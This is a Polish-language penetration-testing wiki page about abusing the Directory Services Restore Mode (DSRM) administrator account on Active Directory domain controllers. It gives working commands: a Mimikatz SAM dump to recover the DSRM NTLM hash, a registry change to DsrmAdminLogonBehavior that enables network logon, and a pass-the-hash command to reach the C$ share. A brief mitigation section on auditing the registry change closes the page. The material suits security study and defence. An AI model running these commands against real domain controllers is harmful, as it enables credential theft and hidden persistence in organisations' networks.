# Dane uwierzytelniające DSRM

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

Każdy kontroler domeny ma konto administratora Directory Services Restore Mode (DSRM). Jego hasło jest ustawiane podczas promocji kontrolera domeny i jest niezależne od kont domenowych Active Directory.<sup>[[1]](#references)</sup>

Atakujący posiadający uprawnienia administracyjne do kontrolera domeny może zrzucić lokalną bazę danych SAM i odzyskać hash NTLM administratora DSRM. Poniższe polecenie Mimikatz wykonuje tę operację:<sup>[[2]](#references)</sup>
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Domyślnie konto DSRM jest przeznaczone do trybu przywracania. Ustawienie `DsrmAdminLogonBehavior` na `2` umożliwia uwierzytelnianie tego konta lokalnego, gdy kontroler domeny działa normalnie. Przed zmianą sprawdź wartość:<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue

if ($null -eq $current) {
New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
} else {
Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
}
```
Odzyskany hash można następnie wykorzystać w sesji pass-the-hash, aby uzyskać dostęp do zasobów, takich jak administracyjny udział `C$`. W przypadku tego konta lokalnego użyj nazwy komputera kontrolera domeny jako wartości `/domain`:<sup>[[3]](#references)</sup>
```powershell
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
# In the new PowerShell process, access C$ over NTLM.
ls \\dc-host-name\C$
```
## Środki zaradcze

- Audytuj zmiany w `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`. Zdarzenie zabezpieczeń 4657 rejestruje modyfikację wartości rejestru, gdy lista SACL klucza jest skonfigurowana do audytowania operacji **Set Value**.<sup>[[4]](#references)</sup>

## References

- [1] [Microsoft: Resetowanie hasła administratora Directory Services Restore Mode](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [2] [ADSecurity: Ukryta persystencja Active Directory nr 11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
- [3] [ADSecurity: Ukryta persystencja Active Directory nr 13 — DSRM Persistence v2](https://adsecurity.org/?p=1785)
- [4] [Microsoft: Zdarzenie 4657 — Zmodyfikowano wartość rejestru](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
{{#include ../../banners/hacktricks-training.md}}
